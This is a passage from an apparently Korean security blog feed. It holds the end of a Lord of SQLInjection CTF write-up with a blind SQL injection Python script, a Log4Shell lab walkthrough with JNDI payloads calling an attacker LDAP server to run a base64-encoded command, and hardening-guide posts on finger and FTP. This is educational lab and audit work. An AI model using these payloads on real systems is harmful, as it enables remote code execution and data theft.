class="string">&#x27;email&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>])) solve(<span class="string">&quot;evil_wizard&quot;</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|proc|union|sleep|benchmark/i&#x27;</span>, <span class="variable">$_GET</span>[order])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id,email,score from prob_evil_wizard where 1 order by <span class="subst">&#123;$_GET[order]&#125;</span>&quot;</span>; <span class="comment">// same with hell_fire? really?</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;table border=1&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;email&lt;/th&gt;&lt;th&gt;score&lt;/th&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$rows</span> = mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$result</span> = mysqli_fetch_array(<span class="variable">$rows</span>)))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) <span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&quot;**************&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;<span class="subst">&#123;$result[id]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[email]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$result[score]&#125;</span>&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[email] = addslashes(<span class="variable">$_GET</span>[email]);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select email from prob_evil_wizard where id=&#x27;admin&#x27; and email=&#x27;<span class="subst">&#123;$_GET[email]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>])) solve(<span class="string">&quot;evil_wizard&quot;</span>);</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="1-줄-해석"><a href="#1-줄-해석" class="headerlink" title="1 줄 해석"></a>1 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|proc|union|sleep|benchmark/i&#x27;</span>, <span class="variable">$_GET</span>[order])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>order 파라미터</code>에서 <code>prob</code> <code>proc</code> <code>union</code> <code>sleep</code> <code>benchmark</code> <code>_</code> <code>.</code>  를 필터링 하고 있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<br>

<br>

<h2 id="6-줄-해석"><a href="#6-줄-해석" class="headerlink" title="6 줄 해석"></a>6 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&quot;admin&quot;</span>) <span class="variable">$result</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&quot;**************&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>admin</code>의 <code>email</code>을 필터링하고있습니다.</p>
<br>

<br>

<h2 id="11-줄-해석"><a href="#11-줄-해석" class="headerlink" title="11 줄 해석"></a>11 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[email] = addslashes(<span class="variable">$_GET</span>[email]);</span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수는 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code> 같은 특수 문자들을 포함하고 있는 문자열에 <code>\</code>을 넣음으로써 쿼리문에서의 오류를 없애 줍니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<p><code>email</code>의 값을 찾아야 하는 <code>Blind SQLi</code>입니다.</p>
<p><code>order by</code> 절을 이용하여 문제를 풀어야 합니다.</p>
<p>이전 문제인 <code>hell_fire</code>과 다른 점은 필터링 하는 문자가 추가됐고, <code>admin</code>의 score이 <code>rubiya</code>의 score 보다 작아서 <code>order by 1 2 3</code> 했을 때 모두 동일하다는 점입니다.</p>
<br>

<br>

<p>저는 아래 사진과 같이 정렬 순서로 참 / 거짓을 판별하여 <code>email</code>을 찾아내었습니다.</p>
<br>

<img src="/images/Lord of SQLInjection/evil_wizard/solve_1.png">

<br>

<p><code>if(조건, 참일 때 결과, 거짓일 때 결과)</code>를 사용해주면 됩니다.</p>
<br>

<p>참 일 때 결과를 <code>admin</code> 행이 첫 번째로 오도록 만들어주었고, 거짓일 때 <code>rubiya</code> 행이 첫 번째로 오도록 만들어주었습니다.</p>
<br>

<img src="/images/Lord of SQLInjection/evil_wizard/solve_2.png">

<br>

<blockquote>
<p>참</p>
</blockquote>
<br>

<br>

<hr>
<img src="/images/Lord of SQLInjection/evil_wizard/solve_3.png">

<br>

<blockquote>
<p>거짓</p>
</blockquote>
<br>

<br>

<p><code>email</code>의 길이를 구하기 위한 쿼리문은 아래와 같습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(id=&#x27;admin&#x27; and length(email)=&#x27;&#123; i &#125;&#x27;,1,9999)%23</span><br></pre></td></tr></table></figure>

<p><code>i</code> 값을 증가 시키면서 <code>email</code>의 길이를 구해주면 됩니다.</p>
<br>

<br>

<p><code>email</code>의 길이를 구하면 한 글자 씩 추출하여 패스워드를 찾으면 됩니다.</p>
<p><code>email</code>를 찾기 위한 쿼리문은 아래와 같습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(id=&#x27;admin&#x27; and substr(email,&#123; i &#125;,1)=char(&#123; j &#125;),1,9999)%23</span><br></pre></td></tr></table></figure>

<p><code>substr</code> 함수로 한 글자 씩 추출하여 <code>pw</code>를 찾습니다.</p>
<br>

<br>

<h2 id="파이썬-코드"><a href="#파이썬-코드" class="headerlink" title="파이썬 코드"></a>파이썬 코드</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?order=&quot;</span></span><br><span class="line">head = &#123;<span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;PHPSESSID=값&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">email = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    query = <span class="string">&quot;if(id=&#x27;admin&#x27; and length(email)=&#x27;&#123;&#125;&#x27;,1,9999)%23&quot;</span>.<span class="built_in">format</span>(length)</span><br><span class="line">    req = requests.get(url+query, headers=head)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[ +&quot;</span>,length,<span class="string">&quot;]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&lt;th&gt;score&lt;/th&gt;&lt;tr&gt;&lt;td&gt;admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;총 길이는&quot;</span>,length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">122</span>):</span><br><span class="line">        query = <span class="string">&quot;if(id=&#x27;admin&#x27; and substr(email,&#123;&#125;,1)=char(&#123;&#125;),1,9999)%23&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i), j)</span><br><span class="line">        req = requests.get(url+query, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;th&gt;score&lt;/th&gt;&lt;tr&gt;&lt;td&gt;admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            email += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(i,<span class="string">&quot;번째 문자 찾는 중 .. : &quot;</span>,email)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;EMAIL : &quot;</span>,email.lower())</span><br></pre></td></tr></table></figure>



<br>

<br>

<img src="/images/Lord of SQLInjection/evil_wizard/solve_4.png">

<br>

<p><code>email</code>의 길이입니다.</p>
<br>

<br>

<img src="/images/Lord of SQLInjection/evil_wizard/solve_5.png">

<br>

<p><code>email</code>를 한 글자 씩 추출하여 구해 줍니다.</p>
<br>

<br>

<img src="/images/Lord of SQLInjection/evil_wizard/solve_6.png">

<br>

<p>** 파이썬에서 패스워드가 대문자로 추출됩니다. 그 이유는 MySQL에서는 대소문자 구분이 없기 때문에 아스키 코드가 더 작은 대문자로 추출됩니다. 소문자로 바꿔주어 넣어주면 됩니다.</p>
<br>

<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Log4Shell] CVE-2021-44228</title>
    <url>/2021/12/14/2021-12-14-Log4Shell%20CVE-2021-44228/</url>
    <content><![CDATA[<h1 id="🔎-Log4j-란"><a href="#🔎-Log4j-란" class="headerlink" title="🔎 Log4j 란"></a>🔎 Log4j 란</h1><br>

<p>JAVA 기반의 Application에서 사용 가능한 오픈소스로 서비스 동작 과정에서 일어나는 모든 기록을 남겨 침해사고 및 이상징후를 점검하기 위해 필수적으로 필요한 기능입니다.</p>
<br>

<p>현재 Log4j 취약점인 Log4Shell(CVE-2021-44228)은 CVSS 스코어 10점으로 가장 높은 심각도를 가지고 있고 JNDI(Java Naming and Directory Interface) 인젝션 취약점을 이용하면 RCE(원격 코드 실행)가 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-환경-구성-후-실습"><a href="#🔔-환경-구성-후-실습" class="headerlink" title="🔔 환경 구성 후 실습"></a>🔔 환경 구성 후 실습</h1><br>

<p>어떤 분이 Log4Shell 취약점 환경을 Docker로 구성 해주셔서 쉽게 실습을 해볼 수 있었습니다.</p>
<blockquote>
<p>버전 정보 : Log4j 2.14.1 (spring-boot-starter-log4j2 2.6.1) &amp; JDK 1.8.0_181</p>
</blockquote>
<br>

<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/보안동향/Log4Shell_CVE-2021-44228/logo.png"></object>
<p>Log4Shell sample vulnerable application (CVE-2021-44228)</p><p>GitHub</p>
<a href="https://github.com/christophetd/log4shell-vulnerable-app"></a>
</div></div>

<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
<th>공격자</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.102:8080</td>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="Start-Docker"><a href="#Start-Docker" class="headerlink" title="Start Docker"></a>Start Docker</h2><br>

<blockquote>
<p>$ docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app</p>
</blockquote>
<br>

<img src="/images/보안동향/Log4Shell_CVE-2021-44228/start_docker.png">

<br>

<br>

<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><br>

<blockquote>
<p>$ curl {공격대상} -H &#39;X-Api-Version: ${jndi:ldap://공격자 IP}&#39;</p>
</blockquote>
<br>

<br>

<h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><br>

<blockquote>
<p>$ curl -i -k 192.168.219.102:8080 -H &#39;X-Api-Version: ${jndi:ldap:://192.168.219.103/log4shell_attacker/index.html}&#39;</p>
</blockquote>
<br>

<img src="/images/보안동향/Log4Shell_CVE-2021-44228/attacker_test.png">

<br>

<br>

<h3 id="취약한-Server-Log"><a href="#취약한-Server-Log" class="headerlink" title="취약한 Server Log"></a>취약한 Server Log</h3><br>

<blockquote>
<p>2021-12-14 12:20:00.052  INFO 1 — [nio-8080-exec-3] HelloWorld : Received a request for API version ${jndi:ldap:://192.168.219.103/log4shell_attacker/index.html}</p>
</blockquote>
<br>

<img src="/images/보안동향/Log4Shell_CVE-2021-44228/server_log_1.png">

<br>

<br>

<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><br>

<h3 id="대기중인-공격자-LDAP-Server"><a href="#대기중인-공격자-LDAP-Server" class="headerlink" title="대기중인 공격자 LDAP Server"></a>대기중인 공격자 LDAP Server</h3><br>

<img src="/images/보안동향/Log4Shell_CVE-2021-44228/ldap_server_1.png">

<br>

<p>대기중인 공격자의 <code>LDAP Server</code> 입니다.</p>
<br>

<br>

<h3 id="공격자-LDAP-Server로-요청"><a href="#공격자-LDAP-Server로-요청" class="headerlink" title="공격자 LDAP Server로 요청"></a>공격자 LDAP Server로 요청</h3><br>

<blockquote>
<p>$ curl 192.168.219.102:8080 -H &#39;X-Api-Version: </p>
<p>${jndi:ldap://192.168.219.103:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9rb3VuOWh3YW4=}&#39;</p>
</blockquote>
<br>

<p><code>touch /tmp/koun9hwan</code>을 <code>base64</code>로 인코딩 하면<code>dG91Y2ggL3RtcC9rb3VuOWh3YW4=</code> 이와같이 나오고, 공격에 성공하면 <code>/tmp/koun9hwan</code> 파일이 만들어집니다.</p>
<br>

<p>취약한 서버에서 공격자 LDAP Server로 요청을 보내면 공격자의 LDAP Server가 악성코드, 백도어 등을 다운받도록 요청을 반환합니다.</p>
<br>

<img src="/images/보안동향/Log4Shell_CVE-2021-44228/ldap_server_2.png">

<br>

<br>

<h3 id="취약한-Server-Log-1"><a href="#취약한-Server-Log-1" class="headerlink" title="취약한 Server Log"></a>취약한 Server Log</h3><br>

<img src="/images/보안동향/Log4Shell_CVE-2021-44228/server_log_2.png">

<br>

<br>

<h3 id="생성된-파일-확인"><a href="#생성된-파일-확인" class="headerlink" title="생성된 파일 확인"></a>생성된 파일 확인</h3><br>

<img src="/images/보안동향/Log4Shell_CVE-2021-44228/exploit_server.png">

<br>

<p><code>/tmp</code> 경로에 <code>koun9hwan</code> 파일이 생성된것을 확인할 수 있습니다.</p>
<br>

<br>

<img src="/images/보안동향/Log4Shell_CVE-2021-44228/log4shell.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-해결방안"><a href="#🔒-해결방안" class="headerlink" title="🔒 해결방안"></a>🔒 해결방안</h1><br>

<table>
<thead>
<tr>
<th></th>
<th>Log4Shell</th>
</tr>
</thead>
<tbody><tr>
<td>영향을 받는 버전</td>
<td>Apache Log4j 2.0-beta9 ~ 2.14.1 모든 버전</td>
</tr>
<tr>
<td>해결방안</td>
<td>최신버전(log4j 2.15)으로 패치<br />2.0-beta9 ~ 2.10.0 : JndiLookup 클래스를 경로에서 제거<br />2.10 ~ 2.14.1 : log4j2.formatMsgNoLookups 또는 LOG4J_FORMAT_MSG_NO_LOOKUPS 환경 변수를 true로 설정</td>
</tr>
</tbody></table>
<br>

<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/보안동향/Log4Shell_CVE-2021-44228/logo.png"></object>
<p>Apache Log4j 2 보안 업데이트 권고</p><p>KISA</p>
<a href="https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389"></a>
</div></div>
]]></content>
      <categories>
        <category>보안동향</category>
      </categories>
      <tags>
        <tag>보안용어</tag>
        <tag>보안동향</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-19 Finger 서비스 비활성화</title>
    <url>/2021/12/20/2021-12-20-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-19%20Finger%20%EC%84%9C%EB%B9%84%EC%8A%A4%20%EB%B9%84%ED%99%9C%EC%84%B1%ED%99%94/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>finger 서비스 비활성화 여부 점검입니다.</p>
<p>항목코드는 <code>U-19</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="Finger"><a href="#Finger" class="headerlink" title="Finger?"></a>Finger?</h2><br>

<p>Finger은 로컬 사용자나 원격 사용자의 <code>계정 정보를 확인</code>할 수 있는 명령어입니다.</p>
<p>해당 명령어는 지정된 사용자의 정보를 <code>/etc/passwd</code> 파일에서 읽고 보여 줍니다.</p>
<br>

<p>Finger 명령어로 확인할 수 있는 사용자의 정보는 <code>UID</code> <code>사용자명</code> <code>홈디렉토리 위치</code> <code>기본 사용 쉘</code> <code>현재 로그인 정보</code> 입니다.</p>
<p>지정된 사용자 홈 디렉토리에 <code>.plan</code> 파일이 존재한다면 Finger 명령어 수행 결과 마지막에 그 내용을 추가하여 보여 줍니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>Finger를 통해서 네트워크 외부에서 해당 시스템에 등록된 사용자 정보를 확인할 수 있어 비인가자에게 사용자 정보가 조회 되는 것을 차단하기 위해 점검합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>비인가자에게 사용자 정보가 조회되어 패스워드 공격을 통한 시스템 권한 탈취 가능성이 있으므로 사용하지 않는다면 해당 서비스를 중지해야합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>네트워크 외부에서 해당 시스템에 등록된 사용자 정보를 확인할 수 있다고 해서 환경 구성 후 확인해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>finger 활성화된 서버</th>
<th>외부 서버 (비인가자)</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.105</td>
<td>192.168.219.104</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>LINUX, AIX<br />HP-UX, <br />SOLARIS 5.9 이하 버전</td>
<td><code>#cat /etc/inetd.conf</code><br /><code>#finger stream tcp nowait bin /usr/lbin/fingered</code><br /><code>fingerd</code> 주석처리 확인</td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td><code>#inetadm | grep &quot;finger&quot;</code></td>
</tr>
<tr>
<td>LINUX<br />(xinetd일 경우)</td>
<td><code>#ls -alL /etc/xinetd.d/* | egrep &quot;echo finger&quot;</code></td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="Finger-서비스-활성화-여부-확인"><a href="#Finger-서비스-활성화-여부-확인" class="headerlink" title="Finger 서비스 활성화 여부 확인"></a>Finger 서비스 활성화 여부 확인</h2><br>

<blockquote>
<p># ls -alL /etc/xinetd.d/* | egrep finger</p>
</blockquote>
<blockquote>
<p># netstat -tulpn | grep LISTEN</p>
</blockquote>
<br>

<br>

<p><code>주요정보통신기반시설 취약점 진단 가이드</code>에서 제시한 방법은 <code>| egrep &quot;echo finger&quot;</code>인데 왜 <code>echo</code>를 붙이는지 모르겠고 결과도 안 나왔습니다.</p>
<br>

<p>로컬 내에서 <code>finger</code> 명령어 사용과 외부에서 사용 가능한지 <code>finger Port(79번)</code>를 통해 점검하면 될 것 같습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/grep.png">

<br>

<br>

<h2 id="외부-서버에서-Finger-서비스-사용"><a href="#외부-서버에서-Finger-서비스-사용" class="headerlink" title="외부 서버에서 Finger 서비스 사용"></a>외부 서버에서 Finger 서비스 사용</h2><br>

<blockquote>
<p># finger @IP주소</p>
</blockquote>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/finger.png">

<br>

<p>현재 로그인 중인 사용자들의 정보를 볼 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>조치 방법</th>
</tr>
</thead>
<tbody><tr>
<td>LINUX, AIX<br />HP-UX, <br />SOLARIS 5.9 이하 버전</td>
<td>1) <code>/etc/inetd.conf</code> 파일에서 finger 서비스 라인 <code>#(주석)</code>처리<br />    (수정 전) <code>finger stream tcp nowait bin /usr/lbin/fingered fingerd</code><br />    (수정 후) <code>#finger stream tcp no wait bin /usr/lbin/fingered fingerd</code><br /><br />2) <code>inetd</code> 서비스 재시작<br />    <code>#ps -ef |grep inetd</code><br />      <code>root 141 1 0 15:03:22 ? 0:01 /usr/sbin/inetd -s</code><br />    <code>#kill -HUP [PID]</code><br /></td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td>inetadm -d “중지하고자 하는 데몬” 명령으로 서비스 데몬 중지<br />    <code>#inetadm -d svc:/etwork/finger:default</code></td>
</tr>
<tr>
<td>LINUX<br />(xinetd일 경우)</td>
<td>1) vi 편집기를 이용하여 “/etc/xinetd.d/finger” 파일 열기<br /><br />2) 아래와 같이 설정 (Disable = yes 설정)<br />    <img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/vi.png"><br /><br />3) xinetd 서비스 재시작<br />    <code>#service xinetd restart</code></td>
</tr>
</tbody></table>
<br>

<br>

<p><code>finger 파일</code>에서 <code>Disable = yes</code> 해준 결과 아래와 같이 연결이 안되는 것을 확인할 수 있습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/finger_2.png">

<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line">PortResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/xinetd.d/finger | grep <span class="built_in">disable</span>`</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *no* ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=O</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=X</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">port=`netstat -tulpn | grep LISTEN | grep 79`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$port</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        PortResult=OPEN</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        PortResult=CLOSE</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e finger 사용여부 : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span><span class="string">&quot;\n&quot;</span>finger 포트\(79번\) : <span class="string">&quot;<span class="variable">$PortResult</span>&quot;</span> | tee /root/result/u-19.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/xinetd.d/finger</code> 파일에서 <code>disable</code> 단어가 포함된 줄을 변수에 저장 후 <code>no</code>라는 단어가 포함되어 있으면 <code>finger</code> 서비스가 실행되고 있는 상태로 판단하였습니다.</p>
<p><code>finger</code> 포트인 <code>79</code>번 포트가 <code>OPEN / CLOSE</code> 상태인지 확인할 수 있도록 만들었습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-19</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-20 Anonymous FTP 비활성화</title>
    <url>/2021/12/20/2021-12-20-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-20%20Anonymous%20FTP%20%EB%B9%84%ED%99%9C%EC%84%B1%ED%99%94/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>익명 FTP 접속 허용 여부 점검입니다.</p>
<p>항목코드는 <code>U-20</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP?"></a>FTP?</h2><br>

<p>파일 전송 프로토콜(File Transfer Protocol, FTP)은 TCP/IP 프로토콜을 가지고 서버와 클라이언트 사이의 파일 전송을 하기 위한 프로토콜입니다.</p>
<p>포트는 <code>21</code>번 포트를 사용합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>실행중인 FTP 서비스에 익명 FTP 접속이 허용되고 있는지 확인하여 접속 허용을 차단하는 것을 목적으로 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>익명 FTP를 사용 시 anonymous 계졍으로 로그인 후 디렉터리에 쓰기 권한이 설정되어 있다면 악의적인 사용자가 local Exploit을 사용하여 시스템에 대한 공격을 가능하게 합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>FTP 활성화된 서버</th>
<th>외부 서버 (비인가자)</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.105</td>
<td>192.168.219.104</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
